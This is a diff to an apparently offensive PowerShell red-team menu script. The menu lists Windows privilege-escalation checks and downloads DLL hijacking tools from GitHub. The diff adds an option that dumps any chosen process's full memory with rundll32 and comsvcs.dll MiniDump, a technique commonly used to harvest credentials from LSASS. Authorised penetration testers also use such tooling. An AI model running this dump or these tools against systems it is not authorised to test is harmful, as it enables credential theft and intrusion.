@@ -320,7 +320,7 @@ while($true){
     write-host " 335. list all softwares installed`t`t`t`t336. use accesschk`t`t`t`t`t`t337. unquoted service path";
     write-host " 338. scheduled tasks`t`t`t`t`t`t339. autorun startup`t`t`t`t`t`t340. check AlwaysInstallElevated enabled";
     write-host " 341. snmp config`t`t`t`t`t`t342. password in registry`t`t`t`t`t343. sysprep or unattend files";
-    write-host " 454. Active Directory infos";
+    write-host " 454. Active Directory infos`t`t`t`t`t459. Dump memory of a process";
     write-host "WEBAPP";
     write-host " 350. Mr-Un1k0d3r/RedTeamCSharpScripts/webhunter";
     write-host "WEBDAV";
@@ -756,6 +756,7 @@ while($true){
         '456' {Scarica "rem1ndsec/DLLJack" "dlljack.ps1" "rem1ndsec/DLLJack/master/dlljack.ps1"}
         '457' {ScaricaSSL "wietze/windows-dll-hijacking" "windows-dll-hijacking.zip" "wietze/windows-dll-hijacking/archive/master.zip"}
         '458' {ScaricaSSL "Flangvik/DLLSideloader" "DLLSideloader.zip" "Flangvik/DLLSideloader/archive/master.zip"}
+        '459' {tasklist; write-host "Digit PID, Process ID"; $TPID=read-host "(example, 6095)"; if($TPID -ne ""){rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump $TPID .\$TPID.bin full}}
         default{write-host 'ERROR: this choice is incorrect'}
     }
     read-host "Press ENTER to continue";
